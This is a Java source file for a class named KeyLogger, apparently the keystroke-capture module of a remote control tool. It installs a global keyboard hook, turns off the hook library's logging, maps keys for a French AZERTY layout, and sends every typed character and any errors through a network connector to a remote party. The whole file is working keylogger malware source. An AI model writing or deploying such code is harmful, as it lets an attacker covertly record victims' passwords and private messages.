package org.graviton.controller;


import com.sun.glass.events.KeyEvent;
import org.graviton.network.Connector;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.util.logging.Level;

public class KeyLogger implements NativeKeyListener {

    static {
        java.util.logging.Logger.getLogger("org.jnativehook").setLevel(Level.OFF);
    }

    private boolean caplock, shift, ctrl;

    public void destroy() {
        try {
            GlobalScreen.unregisterNativeHook();

        } catch (Exception e) {
            Connector.send("e" + e.getMessage());
        }
        GlobalScreen.removeNativeKeyListener(this);
    }

    public void listen() {
        caplock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);

        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            Connector.send("e" + e.getMessage());
        }

        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }


    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if (nativeKeyEvent.getKeyCode() == 42) {
            shift = true;
        } else if (nativeKeyEvent.getRawCode() == 162) {
            ctrl = true;
        } else if (!ctrl) {
            String text = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
            char c = text.charAt(0);
            if (!shift && !caplock && c > 64 && c < 91 && text.length() == 1) {
                text = String.valueOf((char) (c + 32));
            } else {
                switch (nativeKeyEvent.getRawCode()) {
                    case 8:
                        text = "[DELETE]";
                        break;
                    case 32:
                        text = " ";
                        break;
                    case 188:
                        text = ",";
                        break;
                    case 48:
                        text = isMaj() ? "0" : "à";
                        break;
                    case 49:
                        text = isMaj() ? "1" : "&";
                        break;
                    case 50:
                        text = isMaj() ? "2" : "é";
                        break;
                    case 51:
                        text = isMaj() ? "3" : "\"";
                        break;
                    case 52:
                        text = isMaj() ? "4" : "'";
                        break;
                    case 53:
                        text = isMaj() ? "5" : "(";
                        break;
                    case 54:
                        text = isMaj() ? "6" : "-";
                        break;
                    case 55:
                        text = isMaj() ? "7" : "è";
                        break;
                    case 56:
                        text = isMaj() ? "8" : "_";
                        break;
                    case 57:
                        text = isMaj() ? "9" : "ç";
                        break;
                }
            }

            Connector.send("p" + text);
        }
    }

    private boolean isMaj() {
        return shift || caplock;
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        if (nativeKeyEvent.getKeyCode() == 42 && shift)
            shift = false;
        else if (nativeKeyEvent.getRawCode() == 162 && ctrl)
            ctrl = false;
    }
}


